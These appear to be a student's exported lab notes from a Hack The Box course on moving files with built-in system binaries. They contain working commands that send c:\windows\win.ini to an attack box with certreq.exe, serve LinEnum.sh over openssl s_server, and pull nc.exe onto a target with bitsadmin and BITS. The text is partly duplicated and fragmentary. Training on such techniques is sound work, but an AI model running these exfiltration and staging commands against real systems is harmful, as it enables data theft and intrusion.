Resources:

- [LOLBAS Project for Windows Binaries](https://lolbas-project.github.io/)
- [GTFOBins for Linux Binaries](https://gtfobins.github.io/) 
## LOLBAS

- search using /download or /upload 
Situation: we need to listen on a port on our attack box for incoming traffic using netcat, then execute certreq.exe to upload a file
 
### Upload win.ini to pwnbox:

```
C:\htb> certreq.exe -Post -config 
http://192.168.49.128:8000/
 c:\windows\win.ini
￼
Certificate Request Processor: The operation timed out 0x80072ee2 (WinHttp: 12002 ERROR_WINHTTP_TIMEOUT)




burray@htb
[/htb]
$
openssl s_server -quiet -accept 
80
-cert certificate.pem -key key.pem < /tmp/LinEnum.sh

PS C:\htb> bitsadmin /transfer wcb /priority foreground 
http://10.10.15.66:8000/nc.exe
 C:\Users\htb-student\Desktop\nc.exe
PS C:\htb> Import-Module bitstransfer; Start-BitsTransfer -Source "
http://10.10.10.32:8000/nc.exe
" -Destination "C:\Windows\Temp\nc.exe"
￼












```

[http://192.168.49.128:8000/](http://192.168.49.128:8000/) c:\windows\win.ini￼Certificate Request Processor: The operation timed out 0x80072ee2 (WinHttp: 12002 ERROR_WINHTTP_TIMEOUT)
 
### File Received:

![Exported image](Exported%20image%2020240712140349-0.png)  

*** If you get an error, the version may not contain the -Post param***
 
## GTFOBins

- search using +<keyword> 
1. Create Certificate on Pwnbox
    
    1. ![Exported image](Exported%20image%2020240712140349-1.png)
2. Stand up Server on Pwnbox
    
    1. burray@htb[/htb]$openssl s_server -quiet -accept 80-cert certificate.pem -key key.pem < /tmp/LinEnum.sh
3. Download file from compromised machine
    
    1. ![Exported image](Exported%20image%2020240712140349-2.png)
 
## Other Tools

### Bitsadmin Download function

- used to download files from HTTP sites and SMB shares
    
    1. File Download
        
        1. PS C:\htb> bitsadmin /transfer wcb /priority foreground [http://10.10.15.66:8000/nc.exe](http://10.10.15.66:8000/nc.exe) C:\Users\htb-student\Desktop\nc.exe
    2. Download
        
        1. PS C:\htb> Import-Module bitstransfer; Start-BitsTransfer -Source "[http://10.10.10.32:8000/nc.exe](http://10.10.10.32:8000/nc.exe)" -Destination "C:\Windows\Temp\nc.exe"￼

### Certutil

- used to download arbitrary files; defacto wget for Windows **MALICIOUS**
    
    1. Download a file with Certutil
        
        1. ![Exported image](Exported%20image%2020240712140349-3.png)
    2.   
        
 
## LOLBAS
   

### Upload win.ini to pwnbox:
 
### File Received:
   

## GTFOBins
 
### OpenSSL
 
## Other Tools

### Bitsadmin Download function
 
### Certutil